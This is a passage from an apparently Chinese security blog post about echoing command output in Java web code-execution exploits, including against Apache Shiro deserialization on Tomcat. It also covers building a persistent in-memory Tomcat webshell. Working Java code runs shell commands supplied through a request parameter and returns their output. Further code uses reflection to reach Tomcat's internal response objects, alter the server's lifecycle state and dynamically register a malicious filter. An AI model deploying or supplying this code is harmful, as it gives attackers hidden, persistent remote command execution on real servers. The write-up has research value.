class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        cmds=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                    java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    writer.write(output);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331152500423.png" alt="image-20200331152500423"></p>
<p>控制台会有报错，而且网页不会输出原来正常的内容</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402170435460.png" alt="image-20200402170435460"></p>
<p>在response.getWriter()之后加入如下代码将usingWriter的标志置为false即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//目前得到的response是org.apache.catalina.connector.ResponseFacade，其封装了org.apache.catalina.connector.Response，要修改的usingWriter字段在后者中</span></span><br><span class="line">java.lang.reflect.Field r=response.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">r.setAccessible(<span class="literal">true</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span>).getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">usingWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">usingWriter.set(r.get(response), Boolean.FALSE);</span><br></pre></td></tr></table></figure>

<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402174449549.png" alt="image-20200402174449549"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402174525780.png" alt="image-20200402174525780"></p>
<h3 id="局限-1"><a href="#局限-1" class="headerlink" title="局限"></a>局限</h3><p>正如作者文中所述，在shiro反序列化漏洞的利用中是不能成功的</p>
<p>下载shiro，运行官方给出的web demo，如果要跟踪到tomcat内部代码的话，先在pom.xml中加入相应版本的tomcat，因为运行时使用的是tomcat的lib目录下面的jar文件，所以此处的scope使用provided方式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.51<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>在shiro反序列化漏洞最终触发处org.apache.shiro.io.DefaultSerializer#deserialize和上文中存储request，response处下断点</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331165446715.png" alt="image-20200331165446715"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331165601127.png" alt="image-20200331165601127"></p>
<p>会发现request，response的设置是在漏洞触发点之后，所以在触发漏洞执行任意java代码时获取不到我们想要的response（shiro的rememberMe功能其实是shiro实现的一个filter）</p>
<h2 id="基于全局储存获取Tomcat-Response"><a href="#基于全局储存获取Tomcat-Response" class="headerlink" title="基于全局储存获取Tomcat Response"></a>基于全局储存获取Tomcat Response</h2><blockquote>
<p>很多框架对于Serlvet进行了封装，不同框架实现不同，同一框架的不同版本实现也可能不同，因此我们无法利用一种简单通用的方法去获取当前请求的response</p>
</blockquote>
<p>较之前文中获取response的方法，下文换了一种思路，不再寻求改变代码流程，而是寻找有没有Tomcat全局存储的request或response</p>
<h3 id="寻找Tomcat-Response-1"><a href="#寻找Tomcat-Response-1" class="headerlink" title="寻找Tomcat Response"></a>寻找Tomcat Response</h3><p>还是借spring boot项目，查看调用栈</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402153132996.png" alt="image-20200402153132996"></p>
<p>发现Http11Processor中的request和response来自于父类AbstractProcessor，而且这两个Field都是final类型的，也就是说其在赋值之后，对于对象的引用不会改变，那么只要能够获取到这个Http11Processor就可以拿到request和response</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402153304647.png" alt="image-20200402153304647"></p>
<p>在之前的调用链中的AbstractProtocol的内部类ConnectionHandler中在处理的时候就将当前的processor存储在了global中</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402154411203.png" alt="image-20200402154411203"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402154540889.png" alt="image-20200402154540889"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402154637208.png" alt="image-20200402154637208"></p>
<p>其中这个RequestGroupInfo中的processors就是一个存储所有RequestInfo的List</p>
<p>再往后看调用栈，现在要寻找有没有地方有存储AbstractProtocol（继承AbstractProtocol的类）</p>
<p>在CoyoteAdapter的service方法中，发现CoyoteAdapter的connector这个Field有很多关于Request的操作</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402155732546.png" alt="image-20200402155732546"></p>
<p>这个类中就有与AbstractProtocol有关的字段protocolHandler，这个field的类型为ProtocolHandler</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402155924157.png" alt="image-20200402155924157"></p>
<p>可以看一下继承了ProtocolHandler的类，其中与HTTP11有关的也都继承了AbstractProtocol</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402160141103.png" alt="image-20200402160141103"></p>
<p>处理请求的部分就寻找完了，为<br><strong>Connector—–&gt;AbstractProtocol$ConnectoinHandler——-&gt;global——–&gt;RequestInfo——-&gt;Request——–&gt;Response</strong></p>
<p>而在Tomcat启动过程中有这样的方法，可以看到会将Connector放入Service中</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200402160652043.png" alt="image-20200402160652043"></p>
<p>这里的Service为StandardService</p>
<blockquote>
<p>Tomcat的类加载机制并不是传统的双亲委派机制，因为<strong>传统的双亲委派机制并不适用于多个Web App的情况。</strong></p>
<p>假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。<strong>这个定制的ClassLoader就是WebappClassLoader。</strong></p>
<p>那么如何破坏Java原有的类加载机制呢？如果上层的ClassLoader需要调用下层的ClassLoader怎么办呢？就需要<strong>使用****Thread Context ClassLoader，线程上下文类加载器</strong>。Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器，如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。</p>
<p>说了那么多，其实<strong>WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。</strong></p>
</blockquote>
<p>最后的路径</p>
<p><em><strong>WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo(global)—&gt;RequestInfo——-&gt;Request——–&gt;Response</strong></em></p>
<h3 id="获取response-1"><a href="#获取response-1" class="headerlink" title="获取response"></a>获取response</h3><p>在spring boot项目中添加了一个filter，用以模拟之前shiro触发漏洞的情况</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringbootDemoApplication</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		SpringApplication.run(SpringbootDemoApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;TestFilter&quot;, urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//传递命令的参数名</span></span><br><span class="line">            String pass=<span class="string">&quot;cmd12138&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//WebappClassLoaderBase</span></span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ApplicationContext</span></span><br><span class="line">            org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(context);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//StandardService</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">serviceField</span> <span class="operator">=</span> org.apache.catalina.core.ApplicationContext.class.getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            serviceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.core.<span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Connector</span></span><br><span class="line">            org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//筛选Connector</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;connectors.length;i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (connectors[i].getScheme().contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//AbstractProtocol$ConnectoinHandler</span></span><br><span class="line">                    org.apache.coyote.<span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connectors[i].getProtocolHandler();</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//RequestGroupInfo</span></span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取RequestGroupInfo中储存了RequestInfo的processors</span></span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> org.apache.coyote.RequestGroupInfo.class.getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    java.util.<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//通过QueryString筛选</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; list.size(); k++) &#123;</span><br><span class="line">                        org.apache.coyote.RequestInfo requestInfo= (org.apache.coyote.RequestInfo) list.get(k);</span><br><span class="line">                        <span class="keyword">if</span>(requestInfo.getCurrentQueryString().contains(pass))&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//request</span></span><br><span class="line">                            java.lang.reflect.<span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> org.apache.coyote.RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            org.apache.coyote.<span class="type">Request</span> <span class="variable">tempRequest</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//执行命令并回显</span></span><br><span class="line">                            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span>request.getParameter(pass);</span><br><span class="line">                            String[] cmds = !System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> request.getResponse().getWriter();</span><br><span class="line">                            java.lang.reflect.<span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> request.getResponse().getClass().getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">                            usingWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">                            writer.write(output);</span><br><span class="line">                            writer.flush();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request1, response1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="局限-2"><a href="#局限-2" class="headerlink" title="局限"></a>局限</h3><blockquote>
<p>测试shiro的时候，发现一个问题，生成的payload太长了 ，已经超过了Tomcat默认的max header的大小，经过一再缩减也没有成功，于是考虑通过改变Tomcat max header的大小解除限制，思路是改变org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，这个值会影响新的Request的inputBuffer时的对于header的限制，但是由于request的inputbuffer会复用，所以我们在修改完maxHeaderSize之后，需要多个连接同时访问，让tomcat新建request的inputbuffer，这时候的buffer的大小限制就会使用我们修改过后的值</p>
</blockquote>
<p>tomcat7 的结构不太一样，导致 tomcat 7 这种方法拿不到上下文中的 StandardContext</p>
<h2 id="Tomcat内存WebShell"><a href="#Tomcat内存WebShell" class="headerlink" title="Tomcat内存WebShell"></a>Tomcat内存WebShell</h2><p>同样是需要先获取request&#x2F;response，使用了前文第二种通过反射修改变量来改变Tomcat处理请求时的流程的方法</p>
<p>然后继续通过代码执行来动态创建一个filter，以完成一个持久性的内存WebShell</p>
<h3 id="动态注册filter"><a href="#动态注册filter" class="headerlink" title="动态注册filter"></a>动态注册filter</h3><p>Servlet，Listener，Filter由ServletContext去加载，无论是使用xml配置还是使用Annotation注解配置，均由Web容器进行初始化，读取其中的配置属性，然后向Web容器中进行注册。Servlet 3.0 可以由ServletContext动态进行注册，因此需在Web容器初始化的时候（即建立ServletContext对象的时候）进行动态注册</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WebShell</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(javax.servlet.ServletRequest request, javax.servlet.ServletResponse response, javax.servlet.FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> servletContext.addFilter(<span class="string">&quot;webShell&quot;</span>, <span class="keyword">new</span> <span class="title class_">WebShell</span>());</span><br><span class="line">filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>但是直接抛出异常了</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404131608238.png" alt="image-20200404131608238"></p>
<p>因为<code>context.getState()</code>在运行时返回的state已经是<code>LifecycleState.STARTED</code>了</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404132033524.png" alt="image-20200404132033524"></p>
<p>可以用反射进行修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否已有该名字的filter，有则不再添加</span></span><br><span class="line"><span class="keyword">if</span> (servletContext.getFilterRegistration(<span class="string">&quot;webShell&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//因为门面模式的使用，此处servletContext实际是ApplicationContextFacade，需要提取ApplicationContext</span></span><br><span class="line">    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取ApplicationContext中的StandardContext</span></span><br><span class="line">    contextField=applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改state</span></span><br><span class="line">    java.lang.reflect.Field stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册filter</span></span><br><span class="line">    javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> servletContext.addFilter(<span class="string">&quot;webShell&quot;</span>, <span class="keyword">new</span> <span class="title class_">WebShell</span>());</span><br><span class="line">    filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//恢复成LifecycleState.STARTE，否则会造成服务不可用</span></span><br><span class="line">    stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>但是刷新网页发现filter没有成功触发</p>
<p>实际filter的创建是在org.apache.catalina.core.StandardWrapperValve#invoke</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404153408889.png" alt="image-20200404153408889"></p>
<p>跟入ApplicationFilterFactory.createFilterChain</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404154058893.png" alt="image-20200404154058893"></p>
<p>可以看到，从context提取了FilterMap数组，并且遍历添加到filterChain，最终生效，但是这里有两个问题</p>
<p>1.跟入之前注册filter的org.apache.catalina.core.ApplicationContext#addFilter，发现filter被封装成FilterDef添加到了context的filterDefs中，但是filterMaps中并不存在</p>
<p>2.同理也不存在filterConfigs中（findFilterConfig是从context的filterConfigs中获取）</p>
<p>第一个问题其实在filterRegistration.addMappingForUrlPatterns解决了，已经添加到了filterMaps</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404154917906.png" alt="image-20200404154917906"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404155205734.png" alt="image-20200404155205734"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404155241481.png" alt="image-20200404155241481"></p>
<p>而第二个问题，在StandardContext有一个方法filterStart，遍历了filterDefs，一个个实例化成ApplicationFilterConfig添加到filterConfigs中</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404160100463.png" alt="image-20200404160100463"></p>
<p>那么通过反射调用即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(&quot;filterStart&quot;);</span><br><span class="line">filterStartMethod.setAccessible(true);</span><br><span class="line">filterStartMethod.invoke(standardContext, null);</span><br></pre></td></tr></table></figure>



<h3 id="修改filter顺序"><a href="#修改filter顺序" class="headerlink" title="修改filter顺序"></a>修改filter顺序</h3><p>注册filter成功后，还可以优化一下，将该filter调整到最前面的位置</p>
<p>看回org.apache.catalina.core.ApplicationFilterFactory#createFilterChain的代码</p>
